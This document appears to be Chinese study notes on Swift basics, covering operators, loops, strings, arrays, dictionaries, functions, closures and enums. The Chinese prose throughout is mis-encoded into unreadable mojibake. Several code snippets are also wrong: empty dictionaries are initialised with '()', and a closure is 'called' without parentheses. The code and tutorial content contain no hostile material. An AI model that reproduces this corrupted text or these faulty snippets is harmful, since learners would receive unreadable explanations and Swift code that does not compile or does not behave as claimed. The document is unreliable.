ä¸ºè¯¥åŒºé—´åŒ…å«ç¬¬ä¸€ä¸ªå€¼è€Œä¸åŒ…æ‹¬æœ€åçš„å€¼ã€‚ å¦‚ï¼š 1..< 5 åŒºé—´å€¼ä¸º 1, 2, 3, å’Œ 4 å…¶ä»–è¿ç®—ç¬¦ å…¶ä»–ç±»å‹çš„çš„è¿ç®—ç¬¦ï¼Œå¦‚ä¸€å…ƒã€äºŒå…ƒå’Œä¸‰å…ƒè¿ç®—ç¬¦ ä¸€å…ƒå‡: æ•°å­—å‰æ·»åŠ  - å·å‰ç¼€, -3 æˆ– -4 ä¸€å…ƒåŠ : æ•°å­—å‰æ·»åŠ  + å·å‰ç¼€, +6 ç»“æœä¸º 6 ä¸‰å…ƒè¿ç®—ç¬¦: condition ? X : Y, å¦‚æœ condition ä¸º true ï¼Œå€¼ä¸º X ï¼Œå¦åˆ™ä¸º Y é‡è¦ è¿ç®—ç¬¦ä¼˜å…ˆçº§ ä¼˜å…ˆçº§ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡é€’å‡ï¼Œæœ€ä¸Šé¢å…·æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§ï¼Œé€—å·æ“ä½œç¬¦å…·æœ‰æœ€ä½çš„ä¼˜å…ˆçº§ã€‚ ç›¸åŒä¼˜å…ˆçº§ä¸­ï¼ŒæŒ‰ç»“åˆé¡ºåºè®¡ç®—ã€‚å¤§å¤šæ•°è¿ç®—æ˜¯ä»å·¦è‡³å³è®¡ç®—ï¼Œåªæœ‰ä¸‰ä¸ªä¼˜å…ˆçº§æ˜¯ä»å³è‡³å·¦ç»“åˆçš„ï¼Œ å®ƒä»¬æ˜¯å•ç›®è¿ç®—ç¬¦ã€æ¡ä»¶è¿ç®—ç¬¦ã€èµ‹å€¼è¿ç®—ç¬¦ã€‚ åŸºæœ¬çš„ä¼˜å…ˆçº§éœ€è¦è®°ä½ï¼š æŒ‡é’ˆæœ€ä¼˜ï¼Œå•ç›®è¿ç®—ä¼˜äºåŒç›®è¿ç®—ã€‚å¦‚æ­£è´Ÿå·ã€‚ å…ˆä¹˜é™¤ï¼ˆæ¨¡ï¼‰ï¼ŒååŠ å‡ã€‚ å…ˆç®—æœ¯è¿ç®—ï¼Œåç§»ä½è¿ç®—ï¼Œæœ€åä½è¿ç®—ã€‚ ç‰¹åˆ«æ³¨æ„ï¼š 1 << 3 + 2 & 7 ç­‰ä»·äº (1 << (3 + 2))&7 é€»è¾‘è¿ç®—æœ€åè®¡ç®— åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦ï¼š?? åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦ a ?? b å¦‚æœå¯é€‰é¡¹ a æœ‰å€¼åˆ™å±•å¼€ï¼Œå¦‚æœæ²¡æœ‰å€¼ï¼Œæ˜¯ nilï¼Œåˆ™è¿”å›é»˜è®¤å€¼ bã€‚ è¡¨è¾¾å¼ a å¿…é¡»æ˜¯ä¸€ä¸ªå¯é€‰ç±»å‹ï¼Œè¡¨è¾¾å¼ b å¿…é¡»ä¸ a çš„å­˜å‚¨ç±»å‹ç›¸åŒ åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦ï¼Œå®é™…ä¸Šæ˜¯ä¸‰å…ƒè¿ç®—ç¬¦ä½œç”¨åˆ° Optional ä¸Šçš„ç¼©å†™ a != nil ? a! : b å¦‚æœ a çš„å€¼æ˜¯éç©ºï¼Œbçš„å€¼å°†ä¸ä¼šè¢«è€ƒè™‘ï¼Œä¹Ÿå°±æ˜¯åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦æ˜¯çŸ­è·¯çš„ã€‚ Swift æ¡ä»¶è¯­å¥ if switch æœ€ç®€ä¾¿çš„å°±æ˜¯ä¸‰ç›®: Exp1 ? Exp2 : Exp3; Swift å¾ªç¯ for-in éå†ä¸€ä¸ªé›†åˆé‡Œé¢çš„æ‰€æœ‰å…ƒç´ ï¼Œä¾‹å¦‚ç”±æ•°å­—è¡¨ç¤ºçš„åŒºé—´ã€æ•°ç»„ä¸­çš„å…ƒç´ ã€å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ã€‚ for å¾ªç¯ è¯¥å¾ªç¯æ–¹å¼åœ¨ Swift 3 ä¸­å·²ç»å¼ƒç”¨ã€‚ ç”¨æ¥é‡å¤æ‰§è¡Œä¸€ç³»åˆ—è¯­å¥ç›´åˆ°è¾¾æˆç‰¹å®šæ¡ä»¶è¾¾æˆï¼Œ ä¸€èˆ¬é€šè¿‡åœ¨æ¯æ¬¡å¾ªç¯å®Œæˆåå¢åŠ è®¡æ•°å™¨çš„å€¼æ¥å®ç°ã€‚ while å¾ªç¯ è¿è¡Œä¸€ç³»åˆ—è¯­å¥ï¼Œå¦‚æœæ¡ä»¶ä¸ºtrueï¼Œä¼šé‡å¤è¿è¡Œï¼Œç›´åˆ°æ¡ä»¶å˜ä¸ºfalseã€‚ repeat...while å¾ªç¯ ç±»ä¼¼ while è¯­å¥åŒºåˆ«åœ¨äºåˆ¤æ–­å¾ªç¯æ¡ä»¶ä¹‹å‰ï¼Œå…ˆæ‰§è¡Œä¸€æ¬¡å¾ªç¯çš„ä»£ç å—ã€‚ å¾ªç¯æ§åˆ¶è¯­å¥ continue è¯­å¥: å‘Šè¯‰ä¸€ä¸ªå¾ªç¯ä½“ç«‹åˆ»åœæ­¢æœ¬æ¬¡å¾ªç¯è¿­ä»£ï¼Œé‡æ–°å¼€å§‹ä¸‹æ¬¡å¾ªç¯è¿­ä»£ã€‚ break è¯­å¥: ä¸­æ–­å½“å‰å¾ªç¯ã€‚ fallthrough è¯­å¥: å¦‚æœåœ¨ä¸€ä¸ªcaseæ‰§è¡Œå®Œåï¼Œç»§ç»­æ‰§è¡Œä¸‹é¢çš„caseï¼Œ éœ€è¦ä½¿ç”¨fallthrough(è´¯ç©¿)å…³é”®å­—ã€‚ Swift å­—ç¬¦ä¸² åˆ›å»º å¯ä»¥é€šè¿‡ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢é‡æˆ– String ç±»çš„å®ä¾‹æ¥åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²: import Cocoa // ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢é‡ var stringA = \"Hello, World!\" print( stringA ) // String å®ä¾‹åŒ– var stringB = String(\"Hello, World!\") print( stringB ) åˆå§‹åŒ–ç©ºçš„å­—ç¬¦ä¸² å¯ä»¥ä½¿ç”¨ç©ºçš„å­—ç¬¦ä¸²å­—é¢é‡èµ‹å€¼ç»™å˜é‡æˆ–åˆå§‹åŒ–ä¸€ä¸ªStringç±»çš„å®ä¾‹æ¥åˆå§‹å€¼ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸², ä½¿ç”¨å­—ç¬¦ä¸²å±æ€§ isEmpty æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©º: import Cocoa // ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢é‡åˆ›å»ºç©ºå­—ç¬¦ä¸² var stringA = \"\" // å®ä¾‹åŒ– String ç±»æ¥åˆ›å»ºç©ºå­—ç¬¦ä¸² // let stringB = String() if stringA.isEmpty { print( \"stringA æ˜¯ç©ºçš„\" ) } else { print( \"stringA ä¸æ˜¯ç©ºçš„\" ) å­—ç¬¦ä¸²ä¸­æ’å…¥å€¼ æ’å…¥çš„å­—ç¬¦ä¸²å­—é¢é‡çš„æ¯ä¸€é¡¹éƒ½åœ¨ä»¥åæ–œçº¿ä¸ºå‰ç¼€çš„åœ†æ‹¬å·ä¸­: import Cocoa var varA = 20 let constA = 100 var varC:Float = 20.0 var stringA = \"\\(varA) ä¹˜äº \\(constA) ç­‰äº \\(varC * 100)\" print( stringA ) å­—ç¬¦ä¸²è¿æ¥ å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡ + å·æ¥è¿æ¥ å­—ç¬¦ä¸²é•¿åº¦ å­—ç¬¦ä¸²é•¿åº¦ä½¿ç”¨ String.count å±æ€§æ¥è®¡ç®— å­—ç¬¦ä¸²æ¯”è¾ƒ ä½¿ç”¨ == æ¥æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ Unicode å­—ç¬¦ä¸² Unicode æ˜¯ä¸€ä¸ªå›½é™…æ ‡å‡†ï¼Œç”¨äºæ–‡æœ¬çš„ç¼–ç ï¼ŒSwift çš„ String ç±»å‹æ˜¯åŸºäº Unicodeå»ºç«‹çš„ã€‚ ä½ å¯ä»¥å¾ªç¯è¿­ä»£å‡ºå­—ç¬¦ä¸²ä¸­ UTF-8 ä¸ UTF-16 çš„ç¼–ç : import Cocoa var unicodeString = \"èœé¸Ÿæ•™ç¨‹\" print(\"UTF-8 ç¼–ç : \") for code in unicodeString.utf8 { print(\"\\(code) \") } print(\"\\n\") print(\"UTF-16 ç¼–ç : \") for code in unicodeString.utf16 { print(\"\\(code) \") } å­—ç¬¦ä¸²å‡½æ•°åŠè¿ç®—ç¬¦ isEmpty: åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œè¿”å›å¸ƒå°”å€¼ hasPrefix(prefix: String): æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ‹¥æœ‰ç‰¹å®šå‰ç¼€ hasSuffix(suffix: String): æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ‹¥æœ‰ç‰¹å®šåç¼€ã€‚ Int(String): è½¬æ¢å­—ç¬¦ä¸²æ•°å­—ä¸ºæ•´å‹ String.count: Swift 3 ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯ String.characters.count, è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ utf8: æ‚¨å¯ä»¥é€šè¿‡éå† String çš„ utf8 å±æ€§æ¥è®¿é—®å®ƒçš„ UTF-8 ç¼–ç  utf16: æ‚¨å¯ä»¥é€šè¿‡éå† String çš„ utf16 å±æ€§æ¥è®¿é—®å®ƒçš„ utf16 ç¼–ç  unicodeScalars: æ‚¨å¯ä»¥é€šè¿‡éå†Stringå€¼çš„unicodeScalarså±æ€§æ¥è®¿é—®å®ƒçš„ Unicode æ ‡é‡ç¼–ç . +: è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸² +=: è¿æ¥æ“ä½œç¬¦ä¸¤è¾¹çš„å­—ç¬¦ä¸²å¹¶å°†æ–°å­—ç¬¦ä¸²èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œç¬¦å˜é‡ ==: åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ <: æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²çš„å­—æ¯é€ä¸€æ¯”è¾ƒã€‚ !=: æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ç›¸ç­‰ã€‚ Swift å­—ç¬¦(Character) ç©ºå­—ç¬¦å˜é‡ Swift ä¸­ä¸èƒ½åˆ›å»ºç©ºçš„ Characterï¼ˆå­—ç¬¦ï¼‰ ç±»å‹å˜é‡æˆ–å¸¸é‡ éå†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ Swift 3 ä¸­çš„ String éœ€è¦é€šè¿‡ characters å»è°ƒç”¨çš„å±æ€§æ–¹æ³•ï¼Œ åœ¨ Swift 4 ä¸­å¯ä»¥é€šè¿‡ String å¯¹è±¡æœ¬èº«ç›´æ¥è°ƒç”¨ï¼Œä¾‹å¦‚: import Cocoa for ch in \"Runoob\" { print(ch) } å­—ç¬¦ä¸²è¿æ¥å­—ç¬¦ ä½¿ç”¨ String çš„ append() æ–¹æ³•æ¥å®ç°å­—ç¬¦ä¸²è¿æ¥å­—ç¬¦ Swift æ•°ç»„ å¦‚æœåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œå¹¶èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œåˆ™åˆ›å»ºçš„é›†åˆå°±æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚è¿™æ„å‘³ç€åœ¨åˆ›å»ºæ•°ç»„åï¼Œå¯ä»¥é€šè¿‡æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹çš„æ–¹å¼æ”¹å˜æ•°ç»„é‡Œçš„é¡¹ç›®ã€‚ å¦‚æœå°†ä¸€ä¸ªæ•°ç»„èµ‹å€¼ç»™å¸¸é‡ï¼Œæ•°ç»„å°±ä¸å¯æ›´æ”¹ï¼Œå¹¶ä¸”æ•°ç»„çš„å¤§å°å’Œå†…å®¹éƒ½ä¸å¯ä»¥ä¿®æ”¹ã€‚ åˆ›å»ºæ•°ç»„ å¯ä»¥ä½¿ç”¨æ„é€ è¯­æ³•æ¥åˆ›å»ºä¸€ä¸ªç”±ç‰¹å®šæ•°æ®ç±»å‹æ„æˆçš„ç©ºæ•°ç»„ï¼š var someArray = [SomeType]() ä»¥ä¸‹æ˜¯åˆ›å»ºä¸€ä¸ªåˆå§‹åŒ–å¤§å°æ•°ç»„çš„è¯­æ³•: var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements) ä»¥ä¸‹å®ä¾‹åˆ›å»ºäº†ä¸€ä¸ªç±»å‹ä¸º Int ï¼Œæ•°é‡ä¸º 3ï¼Œåˆå§‹å€¼ä¸º 0 çš„ç©ºæ•°ç»„: var someInts = [Int](repeating: 0, count: 3) ä»¥ä¸‹å®ä¾‹åˆ›å»ºäº†å«æœ‰ä¸‰ä¸ªå…ƒç´ çš„æ•°ç»„: var someInts:[Int] = [10, 20, 30] è®¿é—®æ•°ç»„ æ ¹æ®æ•°ç»„çš„ç´¢å¼•æ¥è®¿é—®æ•°ç»„çš„å…ƒç´ ï¼Œè¯­æ³•å¦‚ä¸‹: var someVar = someArray[index] ä¿®æ”¹æ•°ç»„ å¯ä»¥ä½¿ç”¨ append() æ–¹æ³•æˆ–è€…èµ‹å€¼è¿ç®—ç¬¦ += åœ¨æ•°ç»„æœ«å°¾æ·»åŠ å…ƒç´  ä¹Ÿå¯ä»¥é€šè¿‡ç´¢å¼•ä¿®æ”¹æ•°ç»„å…ƒç´ çš„å€¼ éå†æ•°ç»„ å¯ä»¥ä½¿ç”¨for-inå¾ªç¯æ¥éå†æ‰€æœ‰æ•°ç»„ä¸­çš„æ•°æ®é¡¹ åˆå¹¶æ•°ç»„ å¯ä»¥ä½¿ç”¨åŠ æ³•æ“ä½œç¬¦ï¼ˆ+ï¼‰æ¥åˆå¹¶ä¸¤ç§å·²å­˜åœ¨çš„ç›¸åŒç±»å‹æ•°ç»„ count å±æ€§ ä½¿ç”¨ count å±æ€§æ¥è®¡ç®—æ•°ç»„å…ƒç´ ä¸ªæ•° isEmpty å±æ€§ é€šè¿‡åªè¯»å±æ€§ isEmpty æ¥åˆ¤æ–­æ•°ç»„æ˜¯å¦ä¸ºç©º æ³¨è§£ åˆ›å»ºæ•°ç»„çš„æ–¹æ³• æ¨è: var names: [String] = [] var lookup: [String: Int] = [:] ä¸æ¨è: var names = [String]() var lookup = [String: Int]() Swift å­—å…¸ Swift å­—å…¸ç”¨æ¥å­˜å‚¨æ— åºçš„ç›¸åŒç±»å‹æ•°æ®çš„é›†åˆï¼ŒSwift å­—å…¸ä¼šå¼ºåˆ¶æ£€æµ‹å…ƒç´ çš„ç±»å‹ï¼Œå¦‚æœç±»å‹ä¸åŒåˆ™ä¼šæŠ¥é”™ã€‚ Swift å­—å…¸æ¯ä¸ªå€¼ï¼ˆvalueï¼‰éƒ½å…³è”å”¯ä¸€çš„é”®ï¼ˆkeyï¼‰ï¼Œé”®ä½œä¸ºå­—å…¸ä¸­çš„è¿™ä¸ªå€¼æ•°æ®çš„æ ‡è¯†ç¬¦ å¦‚æœåˆ›å»ºä¸€ä¸ªå­—å…¸ï¼Œå¹¶èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œåˆ™åˆ›å»ºçš„å­—å…¸å°±æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚è¿™æ„å‘³ç€åœ¨åˆ›å»ºå­—å…¸åï¼Œå¯ä»¥é€šè¿‡æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹çš„æ–¹å¼æ”¹å˜å­—å…¸é‡Œçš„é¡¹ç›®ã€‚ å¦‚æœå°†ä¸€ä¸ªå­—å…¸èµ‹å€¼ç»™å¸¸é‡ï¼Œå­—å…¸å°±ä¸å¯ä¿®æ”¹ï¼Œå¹¶ä¸”å­—å…¸çš„å¤§å°å’Œå†…å®¹éƒ½ä¸å¯ä»¥ä¿®æ”¹ã€‚ åˆ›å»ºå­—å…¸ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­æ³•æ¥åˆ›å»ºä¸€ä¸ªç‰¹å®šç±»å‹çš„ç©ºå­—å…¸: // var someDict = [KeyType: ValueType]() var someDict: [KeyType: ValueType] = () ä»¥ä¸‹æ˜¯åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ï¼Œé”®çš„ç±»å‹ä¸º Intï¼Œå€¼çš„ç±»å‹ä¸º String çš„ç®€å•è¯­æ³•: // var someDict = [Int: String]() var someDict: [Int: String] = () ä»¥ä¸‹ä¸ºåˆ›å»ºä¸€ä¸ªå­—å…¸çš„å®ä¾‹: var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] è®¿é—®å­—å…¸ æˆ‘ä»¬å¯ä»¥æ ¹æ®å­—å…¸çš„ç´¢å¼•æ¥è®¿é—®æ•°ç»„çš„å…ƒç´ ï¼Œè¯­æ³•å¦‚ä¸‹: var someVar = someDict[key] ä¿®æ”¹å­—å…¸ å¯ä»¥ä½¿ç”¨ updateValue(forKey:) å¢åŠ æˆ–æ›´æ–°å­—å…¸çš„å†…å®¹ã€‚ å¦‚æœ key ä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ å€¼ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¿®æ”¹ key å¯¹åº”çš„å€¼ã€‚ updateValue(_:forKey:)æ–¹æ³•è¿”å›è¢«ä¿®æ”¹çš„Optionalå€¼ ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®šçš„ key æ¥ä¿®æ”¹å­—å…¸çš„å€¼ ç§»é™¤ Key-Value å¯¹ å¯ä»¥ä½¿ç”¨ removeValueForKey() æ–¹æ³•æ¥ç§»é™¤å­—å…¸ key-value å¯¹ å¦‚æœ key å­˜åœ¨è¯¥æ–¹æ³•è¿”å›ç§»é™¤çš„å€¼ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å› nil éå†å­—å…¸ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ for-in å¾ªç¯æ¥éå†æŸä¸ªå­—å…¸ä¸­çš„é”®å€¼å¯¹: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] for (key, value) in someDict { print(\"å­—å…¸ key \\(key) - å­—å…¸ value \\(value)\") } å­—å…¸è½¬æ¢ä¸ºæ•°ç»„ å¯ä»¥æå–å­—å…¸çš„é”®å€¼(key-value)å¯¹ï¼Œå¹¶è½¬æ¢ä¸ºç‹¬ç«‹çš„æ•°ç»„: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] let dictKeys = [Int](someDict.keys) let dictValues = [String](someDict.values) count å±æ€§ å¯ä»¥ä½¿ç”¨åªè¯»çš„ count å±æ€§æ¥è®¡ç®—å­—å…¸æœ‰å¤šå°‘ä¸ªé”®å€¼å¯¹ isEmpty å±æ€§ å¯ä»¥é€šè¿‡åªè¯»å±æ€§ isEmpty æ¥åˆ¤æ–­å­—å…¸æ˜¯å¦ä¸ºç©º Swift å‡½æ•° å‡½æ•°å®šä¹‰: func funcname(å½¢å‚) -> returntype { Statement1 Statement2 â€¦â€¦ Statement N return parameters } å¯å˜å‚æ•° å¯å˜å‚æ•°å¯ä»¥æ¥å—é›¶ä¸ªæˆ–å¤šä¸ªå€¼. é€šè¿‡åœ¨å˜é‡ç±»å‹ååé¢åŠ å…¥ï¼ˆ...ï¼‰çš„æ–¹å¼æ¥å®šä¹‰ å¸¸é‡ï¼Œå˜é‡åŠ I/O å‚æ•° ä¸€èˆ¬é»˜è®¤åœ¨å‡½æ•°ä¸­å®šä¹‰çš„å‚æ•°éƒ½æ˜¯å¸¸é‡å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå‚æ•°ä½ åªå¯ä»¥æŸ¥è¯¢ä½¿ç”¨ï¼Œä¸èƒ½æ”¹å˜å®ƒçš„å€¼ã€‚ å¦‚æœæƒ³è¦å£°æ˜ä¸€ä¸ªå˜é‡å‚æ•°ï¼Œå¯ä»¥åœ¨å‚æ•°å®šä¹‰å‰åŠ  inout å…³é”®å­—ï¼Œè¿™æ ·å°±å¯ä»¥æ”¹å˜è¿™ä¸ªå‚æ•°çš„å€¼äº† ä¾‹å¦‚: func getName(_ name: inout String)......... ä¸€èˆ¬é»˜è®¤çš„å‚æ•°ä¼ é€’éƒ½æ˜¯ä¼ å€¼è°ƒç”¨çš„ï¼Œè€Œä¸æ˜¯ä¼ å¼•ç”¨ã€‚æ‰€ä»¥ä¼ å…¥çš„å‚æ•°åœ¨å‡½æ•°å†…æ”¹å˜ï¼Œå¹¶ä¸å½±å“åŸæ¥çš„é‚£ä¸ªå‚æ•°ã€‚ä¼ å…¥çš„åªæ˜¯è¿™ä¸ªå‚æ•°çš„å‰¯æœ¬ã€‚ å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºè¾“å…¥è¾“å‡ºå‚æ•°æ—¶ï¼Œéœ€è¦åœ¨å‚æ•°åå‰åŠ  & ç¬¦ï¼Œè¡¨ç¤ºè¿™ä¸ªå€¼å¯ä»¥è¢«å‡½æ•°ä¿®æ”¹ã€‚ å®ä¾‹: import Cocoa func swapTwoInts(_ a: inout Int, _ b: inout Int) { let temporaryA = a a = b b = temporaryA } var x = 1 var y = 5 swapTwoInts(&x, &y) print(\"x ç°åœ¨çš„å€¼ \\(x), y ç°åœ¨çš„å€¼ \\(y)\") ä½¿ç”¨å‡½æ•°ç±»å‹ å¯ä»¥å®šä¹‰ä¸€ä¸ªç±»å‹ä¸ºå‡½æ•°çš„å¸¸é‡æˆ–å˜é‡ï¼Œå¹¶å°†é€‚å½“çš„å‡½æ•°èµ‹å€¼ç»™å®ƒ: var addition: (Int, Int) -> Int = sum Swift é—­åŒ… é—­åŒ…(Closures)æ˜¯è‡ªåŒ…å«çš„åŠŸèƒ½ä»£ç å—ï¼Œå¯ä»¥åœ¨ä»£ç ä¸­ä½¿ç”¨æˆ–è€…ç”¨æ¥ä½œä¸ºå‚æ•°ä¼ å€¼ã€‚ Swift ä¸­çš„é—­åŒ…ä¸ C å’Œ Objective-C ä¸­çš„ä»£ç å—ï¼ˆblocksï¼‰ä»¥åŠå…¶ä»–ä¸€äº›ç¼–ç¨‹è¯­è¨€ä¸­çš„ åŒ¿åå‡½æ•°æ¯”è¾ƒç›¸ä¼¼ã€‚ å…¨å±€å‡½æ•°å’ŒåµŒå¥—å‡½æ•°å…¶å®å°±æ˜¯ç‰¹æ®Šçš„é—­åŒ… å¤§å¤šæ•°æƒ…å†µä¸‹, Swiftçš„é—­åŒ…ç›¸å½“äºåŒ¿åå‡½æ•°, æ¯”å¦‚: let driver = { print(\"is driver\") } è°ƒç”¨: driver ä½†æ˜¯è¿™å¹¶ä¸æ„å‘³ç€ä¸èƒ½ä½¿ç”¨å‚æ•°, éœ€è¦çš„å‚æ•°æ˜¯è¢«å†™åœ¨èŠ±æ‹¬å·é‡Œé¢çš„ : ä¸ºäº†è®©ä¸€ä¸ªé—­åŒ…æ¥æ”¶å‚æ•°ï¼Œ éœ€è¦åœ¨ èŠ±æ‹¬å·ä¹‹åæŠŠè¿™äº›å‚æ•°åˆ—å‡ºæ¥ï¼Œç„¶åè·Ÿä¸Šä¸€ä¸ª in å…³é”®å­— ã€‚ è¿™æ ·å°±å‘Šè¯‰Swiftï¼Œé—­åŒ…çš„ä¸»ä½“æ˜¯ä»å“ªé‡Œå¼€å§‹çš„: let driver = { (place: String) in print(\"is driver in \\(place)\") } å‡½æ•°å’Œé—­åŒ…çš„ä¸€ä¸ªåŒºåˆ«æ˜¯è¿è¡Œé—­åŒ…çš„æ—¶å€™ä½ ä¸ä¼šç”¨åˆ°å‚æ•°æ ‡ç­¾, ç›´æ¥è°ƒç”¨å³å¯: driver(\"ç§‹åå±±\") è‹¥éœ€è¦æŒ‡å®šè¿”å›å€¼: let driver = { (place: String) -> String in return \"is driver in \\(place)\" } æ‹–å°¾é—­åŒ…è¯­æ³• å¦‚æœä¸€ä¸ªå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°æ˜¯é—­åŒ…ï¼Œ Swiftå…è®¸ä½ é‡‡ç”¨ä¸€ç§è¢«ç§°ä¸º \"æ‹–å°¾é—­åŒ…è¯­æ³•\" çš„æ–¹å¼æ¥è°ƒç”¨è¿™ä¸ªé—­åŒ…ã€‚ ä½ å¯ä»¥æŠŠé—­åŒ…ä¼ å…¥å‡½æ•°ä¹‹åçš„èŠ±æ‹¬å·é‡Œï¼Œè€Œä¸å¿…åƒä¼ å…¥å‚æ•°é‚£æ ·ã€‚ ä»¥ä¸‹ä¸ºä¾‹: func travel(action: () -> Void) { print(\"æˆ‘å‡†å¤‡å¼€è½¦äº†ã€‚\") action() print(\"æˆ‘å·²æŠµè¾¾ã€‚\") } æ­£å¸¸ä¸€èˆ¬ä¼šè¿™æ ·è°ƒç”¨: travel(action: driver) ç”±äºå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°æ˜¯é—­åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ‹–å°¾é—­åŒ…è¯­æ³•æ¥è°ƒç”¨ ä¸Šä¸€èŠ‚çš„driver: travel() { print(\"is driver\") } æˆ–è€…: travel() { print(\"is driver\") } å®é™…ä¸Šï¼Œç”±äºå‡½æ•°æ²¡æœ‰åˆ«çš„å‚æ•°äº†ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†åœ†æ‹¬å·å®Œå…¨ç§»é™¤: travel { print(\"is driver\") } è‹¥è¦æ¥å—å‚æ•°: func travel(action: (String) -> Void) ... è‹¥éœ€è¦å¸¦è¿”å›å€¼: travel { (place: String) -> String in return \"is driver in \\(place)\" } è‹¥çŸ¥é“placeä¸è¿”å›ç±»å‹, å¯ä»¥å»æ‰æ³¨è§£, åŒæ—¶å› ä¸ºä¸»ä½“åªæœ‰ä¸€è¡Œä»£ç , æ‰€ä»¥returnä¹Ÿå¯ä»¥å»æ‰, å³: travel { place in \"is driver in \\(place)\" } Swiftè¿˜æä¾›ä¸€ç§é€Ÿè®°è¯­æ³•ï¼Œè®©ä½ å¯ä»¥æŠŠä»£ç å˜å¾—æ›´çŸ­ã€‚ æˆ‘ä»¬å¯ä»¥è®©Swiftä¸ºé—­åŒ…çš„å‚æ•°è‡ªåŠ¨æä¾›ä¸€ä¸ªåå­—ï¼Œè€Œä¸å¿…è‡ªè¡Œå†™ä¸‹ place inã€‚ è¿™äº›è‡ªåŠ¨ç”Ÿæˆçš„åå­—ä»¥$å¼€å¤´ï¼Œç„¶åè·Ÿç€ä¸€ä¸ªä»0å¼€å§‹çš„æ•´æ•°ï¼Œå°±åƒä¸‹é¢è¿™æ ·: travel { \"is driver in \\($0)ã€‚\" } Swift æšä¸¾ æšä¸¾ç®€å•çš„è¯´ä¹Ÿæ˜¯ä¸€ç§æ•°æ®ç±»å‹ï¼Œåªä¸è¿‡æ˜¯è¿™ç§æ•°æ®ç±»å‹åªåŒ…å«è‡ªå®šä¹‰çš„ç‰¹å®šæ•°æ®ï¼Œå®ƒæ˜¯ä¸€ç»„æœ‰å…±åŒç‰¹æ€§çš„æ•°æ®çš„é›†åˆã€‚ Swift çš„æšä¸¾ç±»ä¼¼äº Objective C å’Œ C çš„ç»“æ„ï¼Œæšä¸¾çš„åŠŸèƒ½ä¸º: å®ƒå£°æ˜åœ¨ç±»ä¸­ï¼Œå¯ä»¥é€šè¿‡å®ä¾‹åŒ–ç±»æ¥è®¿é—®å®ƒçš„å€¼ã€‚ æšä¸¾ä¹Ÿå¯ä»¥å®šä¹‰æ„é€ å‡½æ•°ï¼ˆinitializersï¼‰æ¥æä¾›ä¸€ä¸ªåˆå§‹æˆå‘˜å€¼ï¼›å¯ä»¥åœ¨åŸå§‹çš„å®ç°åŸºç¡€ä¸Šæ‰©å±•å®ƒä»¬çš„åŠŸèƒ½ã€‚ å¯ä»¥éµå®ˆåè®®ï¼ˆprotocolsï¼‰æ¥æä¾›æ ‡å‡†çš„åŠŸèƒ½ã€‚ å®šä¹‰: enum enumname { // æšä¸¾å®šä¹‰æ”¾åœ¨è¿™é‡Œ case å˜é‡ } caseå…³é”®è¯è¡¨ç¤ºä¸€è¡Œæ–°çš„æˆå‘˜å€¼å°†è¢«å®šä¹‰ã€‚ é‡è¦ å’Œ C å’Œ Objective-C ä¸åŒï¼ŒSwift çš„æšä¸¾æˆå‘˜åœ¨è¢«åˆ›å»ºæ—¶ä¸ä¼šè¢«èµ‹äºˆä¸€ä¸ªé»˜è®¤çš„æ•´å‹å€¼ Swift ç»“æ„ä½“ Swift ç»“æ„ä½“æ˜¯æ„å»ºä»£ç æ‰€ç”¨çš„ä¸€ç§é€šç”¨ä¸”çµæ´»çš„æ„é€ ä½“ã€‚ 